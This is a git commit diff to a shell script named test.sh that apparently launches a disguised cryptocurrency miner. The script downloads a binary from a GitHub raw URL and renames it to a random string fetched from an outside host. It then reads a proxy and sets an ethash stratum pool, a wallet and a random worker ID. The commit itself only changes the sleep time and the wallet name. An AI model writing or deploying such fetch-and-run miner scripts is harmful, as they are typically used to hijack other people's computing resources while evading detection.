5a13e188dd4126d4b6c4fe4f16a5dfb1e7dd23b1
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 05:59:56 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
-sleep 5m
+sleep 3m
 wget https://github.com/rindalasririn/ketaea/raw/main/bubui
 #wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
 chmod +x bubui && mv bubui $ACAK
 read -p 'Input Proxy nya: ' PROXY
-WALLET=prodent
+WALLET=teguhcong
 POOL=stratum+tcp://ethash.poolbinance.com:1800
 WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
 #WORKER2=$(date '+%d%b')
